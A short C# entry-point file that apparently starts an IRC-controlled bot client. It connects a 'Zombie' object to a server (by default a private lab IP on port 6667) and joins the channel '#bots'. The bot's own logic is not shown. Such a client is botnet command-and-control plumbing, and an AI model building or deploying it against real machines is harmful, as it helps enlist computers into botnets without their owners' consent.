using System;
using System.Collections.Generic;

namespace Parrot4Net
{
    class Program
    {
        static void Main(string[] args)
        {
            string server;
            int port;
            int alterport;
            if (args.Length >= 3)
            {
                server = args[0];
                port = Convert.ToInt32(args[1]);
                alterport = Convert.ToInt32(args[2]);
            }
            else if (args.Length == 2)
            {
                server = args[0];
                port = Convert.ToInt32(args[1]);
                alterport = 6669;
            }
            else {
                server = "192.168.72.141";
                port = 6667;
                alterport = 6669;
            }
            string channel = "#bots";
            Zombie z = new Zombie(server, port, alterport, channel);
            z.ConnectAndListen();
        }
    }
}
